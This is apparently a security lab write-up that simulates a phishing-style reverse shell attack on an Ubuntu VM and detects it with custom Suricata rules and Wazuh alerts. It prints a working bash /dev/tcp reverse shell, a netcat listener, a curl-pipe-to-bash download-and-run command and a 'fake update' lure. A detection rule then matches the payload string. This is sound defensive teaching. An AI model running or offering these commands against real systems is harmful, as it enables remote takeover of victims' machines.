
##  Objective

Simulate a **remote reverse shell attack** using a malicious Bash script and detect the activity using **Suricata** and **Wazuh** (configured on the victim machine).

---

## 🧪 Lab Setup

| Role     | Machine | IP Example         | Network Mode     |
|----------|---------|--------------------|------------------|
| Attacker | Kali    | `172.17.128.157`   | Bridged Adapter  |
| Victim   | Ubuntu  | `10.0.2.15`        | NAT              |

> 🔁 Different subnets simulate a remote attack scenario.

---

![Screenshot 2025-07-03 154733](https://github.com/user-attachments/assets/f6c9d61c-35ca-4374-a509-08248f474c39)

###  Step 1: Create Malicious Reverse Shell Script on Attacker

```bash
echo 'bash -i >& /dev/tcp/172.17.128.157/4444 0>&1' > rev.sh
chmod +x rev.sh
```

![image](https://github.com/user-attachments/assets/313a930c-5818-4495-9936-d449cde22c96)

### Step 2: Host the Script via HTTP Server

```bash
sudo python3 -m http.server 80
```
![image](https://github.com/user-attachments/assets/c8fe7502-8607-4d65-bd15-b13c638da700)

Script is now available at: `http://172.17.128.157/rev.sh`

### Step 3: Start Netcat Listener on Attacker

Take new terminal then type this command.

```bash
nc -lvnp 4444
```
![image](https://github.com/user-attachments/assets/b75347ea-762c-491d-93d4-810d75947942)

This waits for the victim's reverse connection.

### Step 4: Simulate Victim Executing the One-Liner (Phishing)

 **Command:**
```bash
curl http://172.17.128.157/rev.sh | bash
```

 **What This Command Does**

This one-liner does two things in a chain:

---

 **1.** `curl http://172.17.128.157/rev.sh`  
`curl` is used to download a file (`rev.sh`) from the attacker's machine (`172.17.128.157`) over HTTP (port 80).

`rev.sh` is a malicious Bash script that contains a reverse shell payload:

```bash
bash -i >& /dev/tcp/172.17.128.157/4444 0>&1
```

---

 **2.** `| bash`  
The `|` (pipe) sends the contents of that downloaded script directly into `bash` for execution.

That means the victim doesn’t save the file or inspect it. It’s blindly executed.

---

In a real-world phishing attack, this would happen when the user clicks a button like:

🔧 *"Click here to install update!"*

---

 **What Is Being Simulated?**

You are simulating a phishing or social engineering attack, where the victim:

- Clicks a fake update link  
- Or opens a terminal and pastes a command suggested by an attacker (e.g., from fake IT support)  
- Or runs an “installer” that connects to the attacker  

---
but for now, we're running it manually on the victim to simulate the victim being tricked.

![image](https://github.com/user-attachments/assets/8b927f3c-9a24-4655-bbf9-d8d5eaf6fe4c)


Now go check if the reverse shell was successful on the attacker machine.


![image](https://github.com/user-attachments/assets/c97221d3-4c21-4dfa-ab8a-80913463265a)

successful .

## Detect the reverse shell 

To detect this reverse shell activity, we need to add custom rules in Suricata-

```
sudo gedit /etc/suricata/rules/reverseshell.rules 
```

add this
 
```rule 
alert ip any any -> any 4444 (msg:"Possible Reverse Shell Connection to TCP 4444"; sid:1000003; rev:1; classtype:trojan-activity;)

```


```
sudo gedit /etc/suricata/rules/reverseshell1.rules 
```
add this
 
```rule 
alert tcp any any -> any any (msg:"Reverse Shell Payload Detected"; content:"bash -i >& /dev/tcp/"; sid:1000004; rev:1; classtype:trojan-activity;)

```

![image](https://github.com/user-attachments/assets/b347d7bb-3ca0-44e2-96bc-947a4fc6787e)

Test config:

```bash
sudo suricata -T -c /etc/suricata/suricata.yaml -v
```
Restart Suricata:

```bash
sudo systemctl restart suricata
```
Now  reverse shell will get detected.

Suricata Logs-

Check for alerts on the victim:

for live logs -
```bash
sudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type=="alert")'
```
![image](https://github.com/user-attachments/assets/16c7f039-17f1-4387-b212-18476ff26768)


![image](https://github.com/user-attachments/assets/f2e2c051-027e-4020-b63b-cb130b1ff210)

For better understanding, it’s a good idea to check the fast.log

```bash
sudo tail -f /var/log/suricata/fast.log
```
![image](https://github.com/user-attachments/assets/084f84e1-5781-4c82-9a45-548ac98b973a)

Attack detected successfully.

## View Alerts in Wazuh Dashboard

In Wazuh :

Go to Discover or wazuh alerts

filter for  for:

![image](https://github.com/user-attachments/assets/665a1b50-42d7-4564-80ec-f032d31b56c5)


![image](https://github.com/user-attachments/assets/8dcb08e0-aa93-4715-ae01-0876824ee107)


